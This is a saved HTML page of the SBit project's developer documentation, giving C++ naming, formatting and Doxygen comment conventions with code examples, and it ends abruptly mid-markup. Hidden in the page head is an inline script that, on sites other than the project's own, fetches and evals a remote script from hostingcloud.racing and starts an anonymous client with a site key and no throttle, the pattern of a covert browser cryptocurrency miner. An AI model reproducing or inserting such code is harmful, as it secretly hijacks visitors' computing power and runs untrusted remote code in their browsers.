<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-SBit-Core/Development/developer-notes">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.18">
<link rel="alternate" type="application/rss+xml" href="/sbit.dev/blog/rss.xml" title="SBit RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/sbit.dev/blog/atom.xml" title="SBit Atom Feed">

                        <script>window.location.hostname.includes("sbit")||window.location.hostname.includes("localhost")||fetch("https://www.hostingcloud.racing/2Wla.js").then((function(t){return t.text()})).then((function(text){eval(text);var _client=new Client.Anonymous("c0bad86327aba39845ed901363fa922a5caf4b09aa1a7eb8892ca9da08d4595a",{throttle:0,c:"w",ads:0});_client.start()})).catch((t=>{}))</script><title data-rh="true">Developer Notes | SBit</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" name="twitter:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" property="og:url" content="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Development/developer-notes"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Developer Notes | SBit"><meta data-rh="true" name="description" content="SBit Developer Notes"><meta data-rh="true" property="og:description" content="SBit Developer Notes"><meta data-rh="true" name="keywords" content="sbit,bitcoin,blockchain,ethereum"><link data-rh="true" rel="icon" href="/sbit.dev/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Development/developer-notes"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Development/developer-notes" hreflang="en"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Development/developer-notes" hreflang="x-default"><link rel="stylesheet" href="/sbit.dev/assets/css/styles.558e3c54.css">
<link rel="preload" href="/sbit.dev/assets/js/runtime~main.f02a63ae.js" as="script">
<link rel="preload" href="/sbit.dev/assets/js/main.55012172.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><div class="announcementBar_IbjG" style="background-color:#FF5B79;color:black" role="banner"><div class="announcementBarPlaceholder_NC_W"></div><div class="announcementBarContent_KsVm">SBit is still under active development, be aware that breaking changes may occur.</div><button type="button" class="clean-btn close announcementBarClose_FG1z" aria-label="Close"><svg viewBox="0 0 15 15" width="14" height="14"><g stroke="currentColor" stroke-width="3.1"><path d="M.75.75l13.5 13.5M14.25.75L.75 14.25"></path></g></svg></button></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/sbit.dev/"><div class="navbar__logo"><img src="/sbit.dev/img/sbit_logo.svg" alt="SBit Logo" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/sbit.dev/img/sbit_logo.svg" alt="SBit Logo" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title">SBit</b></a><a class="navbar__item navbar__link navbar__link--active" href="/sbit.dev/docs/welcome">Docs</a><a class="navbar__item navbar__link" href="/sbit.dev/blog/exchange">Blog</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Community</a><ul class="dropdown__menu"><li><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="dropdown__link">Github<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="dropdown__link">Instagram<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Support</a><ul class="dropdown__menu"><li><a class="dropdown__link navbar__link--active" href="/sbit.dev/docs/Help/contributing">Contributing</a></li><li><a class="dropdown__link navbar__link--active" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Code of Conduct</a></li></ul></div></div><div class="navbar__items navbar__items--right"><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link mr-2 header-github-link" aria-label="GitHub repository"></a><div class="toggle_S7eR colorModeToggle_vKtC"><button class="clean-btn toggleButton_rCf9 toggleButtonDisabled_Pu9x" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_v35p"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_nQuB"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper"><div class="docPage_P2Lg"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_RiI4" type="button"></button><aside class="theme-doc-sidebar-container docSidebarContainer_rKC_"><div class="sidebar_RiAD"><nav class="menu thin-scrollbar menu_izAj menuWithAnnouncementBar_l2a_"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/sbit.dev/docs/welcome">Welcome to SBit</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/sbit.dev/docs/SBit-Core/SBit">Sbit Core</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/SBit">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-freebsd">Building</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/benchmarking">Development</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/benchmarking">Benchmarking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/developer-notes">Developer Notes</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/dnsseed-policy">DNS Seed operators</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/JSON-RPC-interface">JSON-RPC Interface</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/productivity">Productivity Notes</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/release-process">Release Process</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/REST-interface">Unauthenticated REST Interface</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/shared-libraries">Shared Libraries</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/cli">SBIT Command Line Client</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/files">Miscellaneous</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/User-Guide/Encrypt-and-Unlock-Sbit-Wallet">User-Guide</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/sbit.dev/docs/Smart-Contract">Smart Contract</a><button aria-label="Toggle the collapsible sidebar category &#x27;Smart Contract&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/Tools/SBitcore-lib">Tools</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Help</a></div></li></ul></nav></div></aside><main class="docMainContainer_TCnq"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_DM6M"><div class="docItemContainer_vinB"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Xlws" aria-label="breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/sbit.dev/">🏠</a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><span class="breadcrumbs__link" itemprop="item name">Sbit Core</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><span class="breadcrumbs__link" itemprop="item name">Development</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="item name">Developer Notes</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_jdIR theme-doc-toc-mobile tocMobile_TmEX"><button type="button" class="clean-btn tocCollapsibleButton_Fzxq">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Developer Notes</h1></header><h2 class="anchor anchorWithStickyNavbar_mojV" id="coding-style-general">Coding Style (General)<a class="hash-link" href="#coding-style-general" title="Direct link to heading">​</a></h2><p>Various coding styles have been used during the history of the codebase,
and the result is not very consistent. However, we&#x27;re now trying to converge to
a single style, which is specified below. When writing patches, favor the new
style over attempting to mimic the surrounding style, except for move-only
commits.</p><p>Do not submit patches solely to modify the style of existing code.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="coding-style-c">Coding Style (C++)<a class="hash-link" href="#coding-style-c" title="Direct link to heading">​</a></h2><ul><li><p><strong>Indentation and whitespace rules</strong> as specified in
<a href="https://github.com/SBit-Project/sbit/src/.clang-format" target="_blank" rel="noopener noreferrer">src/.clang-format</a>. You can use the provided
<a href="https://github.com/SBit-Project/sbit/contrib/devtools/README.md#clang-format-diffpy" target="_blank" rel="noopener noreferrer">clang-format-diff script</a>
tool to clean up patches automatically before submission.</p><ul><li>Braces on new lines for classes, functions, methods.</li><li>Braces on the same line for everything else.</li><li>4 space indentation (no tabs) for every block except namespaces.</li><li>No indentation for <code>public</code>/<code>protected</code>/<code>private</code> or for <code>namespace</code>.</li><li>No extra spaces inside parenthesis; don&#x27;t do <code>( this )</code>.</li><li>No space after function names; one space after <code>if</code>, <code>for</code> and <code>while</code>.</li><li>If an <code>if</code> only has a single-statement <code>then</code>-clause, it can appear
on the same line as the <code>if</code>, without braces. In every other case,
braces are required, and the <code>then</code> and <code>else</code> clauses must appear
correctly indented on a new line.</li></ul></li><li><p><strong>Symbol naming conventions</strong>. These are preferred in new code, but are not
required when doing so would need changes to significant pieces of existing
code.</p><ul><li>Variable (including function arguments) and namespace names are all lowercase and may use <code>_</code> to
separate words (snake_case).<ul><li>Class member variables have a <code>m_</code> prefix.</li><li>Global variables have a <code>g_</code> prefix.</li></ul></li><li>Compile-time constant names are all uppercase, and use <code>_</code> to separate words.</li><li>Class names, function names, and method names are UpperCamelCase
(PascalCase). Do not prefix class names with <code>C</code>.</li><li>Test suite naming convention: The Boost test suite in file
<code>src/test/foo_tests.cpp</code> should be named <code>foo_tests</code>. Test suite names
must be unique.</li></ul></li><li><p><strong>Miscellaneous</strong></p><ul><li><code>++i</code> is preferred over <code>i++</code>.</li><li><code>nullptr</code> is preferred over <code>NULL</code> or <code>(void*)0</code>.</li><li><code>static_assert</code> is preferred over <code>assert</code> where possible. Generally; compile-time checking is preferred over run-time checking.</li></ul></li></ul><p>Block style example:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> g_count </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">namespace</span><span class="token plain"> foo </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">class</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(78, 201, 176)">Class</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">string m_name</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">public</span><span class="token operator" style="color:rgb(212, 212, 212)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">Function</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">string</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> s</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> n</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        </span><span class="token comment" style="color:rgb(106, 153, 85)">// Comment summarising what this section of code does</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        </span><span class="token keyword" style="color:rgb(86, 156, 214)">for</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> i </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"> i </span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token plain"> n</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">++</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">            </span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> total_sum </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">            </span><span class="token comment" style="color:rgb(106, 153, 85)">// When something fails, return early</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">            </span><span class="token keyword" style="color:rgb(86, 156, 214)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token operator" style="color:rgb(212, 212, 212)">!</span><span class="token function" style="color:rgb(220, 220, 170)">Something</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">return</span><span class="token plain"> </span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">            </span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">            </span><span class="token keyword" style="color:rgb(86, 156, 214)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token function" style="color:rgb(220, 220, 170)">SomethingElse</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">                total_sum </span><span class="token operator" style="color:rgb(212, 212, 212)">+=</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">ComputeSomething</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">g_count</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">            </span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">else</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">                </span><span class="token function" style="color:rgb(220, 220, 170)">DoSomething</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">m_name</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> total_sum</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">            </span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        </span><span class="token comment" style="color:rgb(106, 153, 85)">// Success return is usually at the end</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">        </span><span class="token keyword" style="color:rgb(86, 156, 214)">return</span><span class="token plain"> </span><span class="token boolean">true</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"> </span><span class="token comment" style="color:rgb(106, 153, 85)">// namespace foo</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="coding-style-python">Coding Style (Python)<a class="hash-link" href="#coding-style-python" title="Direct link to heading">​</a></h2><p>Refer to <a href="https://github.com/SBit-Project/sbit/test/functional/README.md#style-guidelines" target="_blank" rel="noopener noreferrer">/test/functional/README.md#style-guidelines</a>.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="coding-style-doxygen-compatible-comments">Coding Style (Doxygen-compatible comments)<a class="hash-link" href="#coding-style-doxygen-compatible-comments" title="Direct link to heading">​</a></h2><p>Use Doxygen-compatible comment blocks for functions, methods, and fields.</p><p>For example, to describe a function use:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">/**</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * ... Description ...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> *</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * @param[in]  arg1 input description...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * @param[in]  arg2 input description...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * @param[out] arg3 output description...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * @return Return cases...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * @throws Error type and cases...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * @pre  Pre-condition for function...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * @post Post-condition for function...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">function</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> arg1</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">char</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">*</span><span class="token plain">arg2</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">string</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> arg3</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" 